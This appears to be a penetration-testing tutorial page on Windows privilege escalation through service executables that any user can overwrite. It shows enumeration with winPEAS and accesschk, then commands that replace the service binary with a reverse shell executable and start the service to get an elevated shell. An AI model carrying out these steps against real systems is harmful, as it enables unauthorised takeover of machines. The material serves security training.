# Insecure Service Executables

If the original service executable is modifiable by our user, we can simply replace it with our reverse shell executable. Remember to create a backup of the original executable if you are exploiting this in a real system!

Run winPEAS to check for service misconfigurations:

```text
winPEASany.exe quiet servicesinfo
```

![](../../../../../.gitbook/assets/image%20%2886%29.png)

Note that the “filepermsvc” service has an executable which appears to be writable by everyone. We can confirm this with accesschk.exe:

```text
accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
```

![](../../../../../.gitbook/assets/image%20%2891%29.png)

Create a backup of the original service executable:

```text
copy "C:\Program Files\File Permissions Service\filepermservice.exe" C:\Temp
```

Copy the reverse shell executable to overwrite the service executable:

```text
copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe"
```

![](../../../../../.gitbook/assets/image%20%2896%29.png)

Start a listener on Kali, and then start the service to trigger the exploit:

```text
net start filepermsvc
```

![](../../../../../.gitbook/assets/image%20%2883%29.png)











